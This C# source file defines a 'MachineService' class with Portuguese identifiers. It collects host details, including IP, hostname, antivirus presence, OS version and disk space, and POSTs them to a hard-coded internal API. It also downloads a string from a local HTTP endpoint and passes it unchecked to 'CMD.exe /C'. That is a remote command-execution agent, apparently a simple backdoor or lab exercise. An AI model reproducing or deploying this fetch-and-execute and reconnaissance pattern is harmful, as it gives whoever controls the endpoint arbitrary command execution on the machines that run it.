using BattleService.Model;
using RestSharp;
using System;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;

namespace BattleService
{
    public class MachineService
    {
        public bool AntiVirusInstalado()
        {
            var wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter";
            try
            {
                var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                ManagementObjectCollection instances = searcher.Get();
                return instances.Count > 0;
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
                return false;
            }
        }

        private string getHostName() => Dns.GetHostName();

        private string getIp()
        {
            var name = Dns.GetHostName();
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "";
        }

        private string getWindowsVersion()
        {
            return Environment.OSVersion.VersionString;
        }

        private string getNetVersion()
        {
            return Environment.Version.ToString();
        }

        public string getSizeHD()
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    var size = drive.TotalSize / 1024 / 1024 / 1024;
                    return size.ToString();
                }
            }
            return "";
        }

        public string getFreeSizeHD()
        {
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady)
                {
                    var size = drive.TotalFreeSpace / 1024 / 1024 / 1024;
                    return size.ToString();
                }
            }
            return "";
        }

        public Machine GetInformationMachine()
        {
            var machine = new Machine();
            machine.IpLocal = getIp();
            machine.Nome = getHostName();
            machine.AtivirusInstalado = AntiVirusInstalado();
            machine.VersaoWindows = getWindowsVersion();
            machine.VersaoNet = getNetVersion();
            machine.TamanhoHD = getSizeHD();
            machine.DisponivelHD = getFreeSizeHD();
            return machine;
        }

        public void EnviarParaApi(Machine machine)
        {
            Console.WriteLine("Enviando informações para API");
            var client = new RestClient("http://192.168.114.2:60751");
            var request = new RestRequest("/api/BattleRoyalle", Method.POST);
            request.AddJsonBody(machine);
            client.Execute(request);
        }

        public void ReceberCmdEExecutar()
        {
            var client = new RestClient("http://localhost:60246");
            var request = new RestRequest("/api/BattleRoyalle", Method.GET);

            var response = client.Execute(request);
            Console.WriteLine(response.Content);

            var strCmdText = @"/C " + response.Content;
            System.Diagnostics.Process.Start("CMD.exe", strCmdText);

        }
    }
}
